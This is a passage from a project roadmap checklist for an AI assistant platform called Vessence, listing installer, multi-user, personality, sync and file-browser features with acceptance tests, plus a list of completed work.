  - **Test:** Run `sudo dpkg -i vessence.deb` on a fresh Ubuntu 22.04. Docker is installed (if not present), Vessence container is pulled and started. Desktop shortcut is created. Open browser to `localhost:PORT` — Vessence UI loads.

### 10.2 Windows Installer
- [ ] Windows `.exe` installer
  - **Test:** Run `vessence-setup.exe` on Windows 10/11. Docker Desktop is installed (if not present), Vessence container is pulled and started. Start menu shortcut is created. Open browser — Vessence UI loads.

### 10.3 Mac Installer
- [ ] Mac `.dmg` installer (built via GitHub Actions macOS runner)
  - **Test:** Open `Vessence.dmg` on macOS 13+. Drag to Applications. Launch — Docker Desktop is installed (if not present), Vessence container is pulled and started. Menu bar icon appears. Open browser — Vessence UI loads. Verify GitHub Actions workflow builds and signs the `.dmg` successfully.

### 10.4 One-Click Experience
- [ ] One-click install experience across all platforms
  - **Test:** Give the installer to a non-technical user. They should be able to install and reach the Vessence UI with zero terminal commands, zero manual Docker configuration, and zero troubleshooting. Time from download to working UI: under 10 minutes.

---

## Phase 11: Multi-User

### 11.0 Multi-User Groundwork (DONE)
- [x] `vault_web/auth.py` supports comma-separated `ALLOWED_GOOGLE_EMAILS` for multiple users
- [x] Each user gets their own session with `user_id` derived from email
- [x] `agent_skills/user_manager.py` created — per-user config, personality, memory namespace management
- [x] Per-user directories at `$VESSENCE_DATA_HOME/users/<user_id>/config.json`

### 11.1 Per-User Jane Instances
- [ ] Per-user Jane instances with separate memory
  - **Test:** Create users A and B in separate-Jane mode. User A tells Jane "My favorite color is blue." User B asks Jane "What's my favorite color?" — Jane does not know. Verify ChromaDB collections are completely separate per user.

### 11.2 Shared Jane Mode
- [ ] Shared Jane with separate conversation histories
  - **Test:** Create users A and B in shared-Jane mode. User A tells Jane "Our project deadline is Friday." User B asks "When is the project deadline?" — Jane knows (shared memory). Verify conversation history shows only each user's own messages.

### 11.3 Admin Panel
- [ ] Admin panel for managing user accounts and permissions
  - **Test:** Admin creates user C, sets mode to "separate Jane", grants access to 2 essences. User C logs in — sees only those 2 essences. Admin deletes user C — all user C data is removed. Admin can view user list, modify settings, and set storage quotas.

---

## Phase 12: Polish

### 12.1 Jane Personality (GROUNDWORK DONE)
- [x] Personality preset files created: `configs/personalities/{default,professional,casual,technical}.md`
- [x] Personality dropdown added to vault_web Settings tab
- [x] API endpoints: `GET/POST /api/settings/personality`
- [x] Per-user personality stored in `$VESSENCE_DATA_HOME/users/<user_id>/config.json`
- [ ] Wire personality selection into Jane's system prompt at runtime (read from user config on each turn)
  - **Test:** User selects "casual" personality in settings. Jane's next response uses casual, friendly language. Switch to "technical" — Jane switches to code-first, terse responses. Verify personality is loaded from the user's config file on each turn.

### 12.2 Proactive Messaging
- [ ] Proactive Jane messaging (deferred — TBD)
  - **Note:** Design and implementation deferred to a dedicated future conversation. This covers push notifications, proactive suggestions, scheduled check-ins, and trigger-based alerts.

### 12.3 Vault Network Drive
- [ ] Vault network drive (real-time sync like Dropbox, ask on mobile data)
  - **Test:** Mount vault as a network drive on desktop. Create a file — it appears in vault within 5 seconds. On mobile data, sync prompts "You're on mobile data. Sync now?" — user can accept or defer. Verify bidirectional sync (changes on either side propagate).

### 12.4 Native File Browser
- [ ] Native Android file browser for Life Librarian
  - **Test:** Open Life Librarian essence on Android. Native file browser renders (not a WebView). Browse folders, preview images, open PDFs. Upload a file via the browser — it's stored in vault. Search within the file browser — results appear.

### 12.5 Cross-Device Sync
- [ ] Chat history sync across all devices
  - **Test:** Send a message from Android app. Open web UI — same message appears in history. Send a message from web — appears on Android. Verify sync works via both LAN and relay connections. Offline messages sync when connection is restored.

---

## Completed

- [x] Core architecture decisions (18 decisions documented in VESSENCE_SPEC.md)
- [x] Distribution models defined (buy, rent, free)
- [x] Essence #1: File archivist (vault) — functional, needs refactoring into essence format
- [x] Memory system (ChromaDB, Librarian, Archivist, Janitor) — operational
- [x] Jane operational as CLI and web agent
- [x] Amber operational on Discord via Google ADK
- [x] Android app built and deployed
- [x] Website (vault-centric) deployed at vessences.com
- [x] Memory hook fix (plain text output for Claude Code hooks)
- [x] Parallelized ChromaDB queries in memory retrieval
- [x] Cross-model memory bypass (Claude + OpenAI skip librarian)
- [x] Janitor switched to Claude Haiku with Gemini/OpenAI fallback
- [x] Archivist switched to Claude Haiku
- [x] Prompt queue runner fixed (was using Codex, now uses Claude)
- [x] Android Google sign-in fixed (client ID was placeholder)
- [x] Multi-user auth groundwork — comma-separated ALLOWED_GOOGLE_EMAILS, per-user sessions with user_id
- [x] User manager module — per-user config, personality, memory namespace at $VESSENCE_DATA_HOME/users/
- [x] Jane personality presets — 4 personality files (default, professional, casual, technical)
- [x] Personality Settings UI — dropdown in vault_web Settings tab with API endpoints
- [x] Relay server account system — database.py with users, essences, purchases, reviews tables
